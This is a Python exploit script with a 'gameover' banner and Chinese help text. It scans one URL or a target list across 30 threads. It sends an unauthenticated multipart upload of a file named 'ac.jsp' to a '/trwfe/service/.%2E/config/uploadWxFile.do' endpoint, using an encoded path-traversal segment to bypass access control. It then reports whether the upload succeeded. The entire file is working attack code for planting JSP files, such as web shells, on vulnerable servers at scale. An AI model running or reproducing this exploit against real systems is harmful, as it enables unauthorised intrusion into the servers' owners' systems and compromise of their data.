import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    banner = """
       _________    _____   ____  _______  __ ___________ 
      / ___\__  \  /     \_/ __ \/  _ \  \/ // __ \_  __ \
     / /_/  > __ \|  Y Y  \  ___(  <_> )   /\  ___/|  | \/
     \___  (____  /__|_|  /\___  >____/ \_/  \___  >__|   
    /_____/     \/      \/     \/                \/                                                                         

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    pool = Pool(30)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            check(f"http://{args.url}")
    elif args.file:
        with open(args.file) as f:
            targets=[]
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    target = f"http://{target}"
                    targets.append(target)
            pool.map(check, targets)


def check(target):
    target = f"{target}/trwfe/service/.%2E/config/uploadWxFile.do"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        ,'Content-Type':'multipart/form-data'

    }
    data = """-------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="ac.jsp"
Content-Type: application/octet-stream


------WebKitFormBoundaryaKljzbg49Mq4ggLz--"""
    try:
        response = requests.post(url=target, headers=headers, data=data, verify=False)
        if response.status_code == 200 and 'true' in response.text:
            print(f"{target}文件上传成功")
        else:
            print(f"{target}文件上传失败")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()